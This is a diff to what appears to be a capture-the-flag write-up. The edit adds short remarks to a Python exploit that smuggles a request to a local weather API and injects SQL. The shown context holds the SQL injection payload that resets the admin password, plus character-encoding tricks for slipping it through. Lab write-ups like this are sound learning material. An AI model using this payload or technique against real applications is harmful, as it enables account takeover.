@@ -281,7 +281,7 @@ GET /data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey} HTTP/1.1
 Host: 127.0.0.1
 ```
 
-I used Python to send this request:
+You might find the first line lacks of "HTTP/1.1", but both will work after tesdting. I used Python to send this request:
 
 ```text-plain
 import requests
@@ -292,6 +292,7 @@ url = "http://46.101.48.208:30911"
 # For SQLi
 username = "admin"
 password = "doesntmatter') ON CONFLICT(username) DO UPDATE SET password ='admin';--"
+# We can also replace " " with "+" (urlencode)
 parsed_password = password.replace(" ", "\u0120").replace("'", "%27")
 content_length = len(username) + len(parsed_password) + 19
 
